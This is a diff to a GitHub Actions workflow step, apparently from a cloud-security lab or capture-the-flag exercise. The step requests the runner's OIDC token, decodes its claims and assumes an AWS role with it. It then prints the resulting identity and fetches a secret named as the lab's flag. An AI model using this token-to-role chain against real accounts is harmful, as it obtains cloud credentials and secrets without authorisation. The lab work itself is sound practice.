@@ -8,20 +8,24 @@ jobs:
     runs-on: ubuntu-latest
     steps:
       - name: Assume via OIDC (manuel)
+        shell: bash
         run: |
+          set +e
           TOKEN=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
             "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r '.value')
           echo "=== CLAIMS ==="
-          echo "$TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq '{sub, aud, repository}'
-          CREDS=$(aws sts assume-role-with-web-identity \
+          python3 -c "import sys,json,base64; p=sys.argv[1].split('.')[1]; p+='='*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p)); print(json.dumps({k:c.get(k) for k in ['sub','aud','iss','repository']}, indent=2))" "$TOKEN"
+          echo "=== ASSUME (sortie brute, erreur incluse) ==="
+          OUT=$(aws sts assume-role-with-web-identity \
             --role-arn arn:aws:iam::556300512497:role/sts-lab-2-target \
             --role-session-name neeho-lab2 \
             --web-identity-token "$TOKEN" \
-            --query Credentials --output json)
-          export AWS_ACCESS_KEY_ID=$(echo "$CREDS" | jq -r .AccessKeyId)
-          export AWS_SECRET_ACCESS_KEY=$(echo "$CREDS" | jq -r .SecretAccessKey)
-          export AWS_SESSION_TOKEN=$(echo "$CREDS" | jq -r .SessionToken)
+            --query Credentials --output json 2>&1)
+          echo "$OUT"
+          export AWS_ACCESS_KEY_ID=$(echo "$OUT"     | jq -r .AccessKeyId 2>/dev/null)
+          export AWS_SECRET_ACCESS_KEY=$(echo "$OUT" | jq -r .SecretAccessKey 2>/dev/null)
+          export AWS_SESSION_TOKEN=$(echo "$OUT"     | jq -r .SessionToken 2>/dev/null)
           echo "=== IDENTITY ==="
-          aws sts get-caller-identity
+          aws sts get-caller-identity 2>&1
           echo "=== FLAG ==="
-          aws secretsmanager get-secret-value --secret-id flag_sts_lab_2 --query SecretString --output text
+          aws secretsmanager get-secret-value --secret-id flag_sts_lab_2 --query SecretString --output text 2>&1
